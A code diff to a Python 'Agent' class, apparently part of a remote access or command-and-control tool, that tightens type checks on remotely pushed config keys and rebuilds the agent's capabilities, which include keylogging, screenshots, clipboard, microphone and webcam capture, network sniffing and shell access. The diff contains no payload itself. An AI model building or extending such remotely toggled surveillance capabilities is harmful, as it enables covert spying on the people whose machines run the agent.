@@ -838,14 +838,15 @@ class Agent:
         )
         return message.to_bytes()
 
-    # Allowed keys for remote config updates (safe, non-sensitive)
-    ALLOWED_CONFIG_KEYS: Dict[str, type] = {
+    # Allowed keys for remote config updates (safe, non-sensitive).
+    # Values are tuples of accepted types for isinstance() checks.
+    ALLOWED_CONFIG_KEYS: Dict[str, Tuple[type, ...]] = {
         "heartbeat_interval": (int, float),
         "reconnect_interval": (int, float),
-        "cap_keylogging": bool,
-        "cap_screenshots": bool,
-        "cap_clipboard": bool,
-        "cap_process": bool,
+        "cap_keylogging": (bool,),
+        "cap_screenshots": (bool,),
+        "cap_clipboard": (bool,),
+        "cap_process": (bool,),
     }
 
     # Default command handlers
@@ -868,6 +869,29 @@ class Agent:
             accepted[key] = value
 
         self.config.update(accepted)
+
+        # Apply accepted values to runtime attributes
+        if "heartbeat_interval" in accepted:
+            self.heartbeat_interval = float(accepted["heartbeat_interval"])
+        if "reconnect_interval" in accepted:
+            self.reconnect_interval = float(accepted["reconnect_interval"])
+
+        # Rebuild capabilities if any cap_* keys changed
+        cap_keys = [k for k in accepted if k.startswith("cap_")]
+        if cap_keys:
+            self.capabilities = AgentCapabilities(
+                keylogging=self.config.get("cap_keylogging", self.capabilities.keylogging),
+                screenshots=self.config.get("cap_screenshots", self.capabilities.screenshots),
+                file_upload=self.config.get("cap_file_upload", self.capabilities.file_upload),
+                file_download=self.config.get("cap_file_download", self.capabilities.file_download),
+                clipboard_monitor=self.config.get("cap_clipboard", self.capabilities.clipboard_monitor),
+                microphone_record=self.config.get("cap_microphone", self.capabilities.microphone_record),
+                webcam_capture=self.config.get("cap_webcam", self.capabilities.webcam_capture),
+                process_monitor=self.config.get("cap_process", self.capabilities.process_monitor),
+                network_sniff=self.config.get("cap_network", self.capabilities.network_sniff),
+                shell_access=self.config.get("cap_shell", self.capabilities.shell_access),
+            )
+
         return {
             "status": "config_updated",
             "accepted": list(accepted.keys()),
